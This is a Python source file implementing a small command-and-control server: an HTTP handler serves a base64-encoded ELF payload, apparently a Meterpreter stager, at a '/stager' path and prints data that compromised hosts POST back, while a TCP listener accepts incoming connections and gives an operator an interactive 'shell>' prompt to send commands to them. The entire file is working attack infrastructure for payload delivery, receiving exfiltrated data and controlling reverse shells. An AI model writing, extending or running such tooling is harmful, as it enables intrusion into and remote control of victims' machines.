from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
import threading
import socket

class C2Module:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def http_server(self):
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/stager':
                    try:
                        with open('linux_x64_meter.elf', 'rb') as f:
                            data = base64.b64encode(f.read()).decode()
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(data.encode())
                    except:
                        self.send_response(404)
            
            def do_POST(self):
                content_len = int(self.headers['Content-Length'])
                data = self.rfile.read(content_len).decode()
                print(f"[C2] {data}")
                self.send_response(200)
                self.end_headers()
        
        server = HTTPServer((self.lhost, 8080), Handler)
        server.serve_forever()
    
    def tcp_listener(self):
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.lhost, self.lport))
        s.listen(20)
        while True:
            client, addr = s.accept()
            threading.Thread(target=self.handle_shell, args=(client,)).start()
    
    def handle_shell(self, client):
        while True:
            cmd = input("shell> ")
            if cmd == 'exit': break
            client.send(cmd.encode())
            result = client.recv(4096).decode()
            print(result)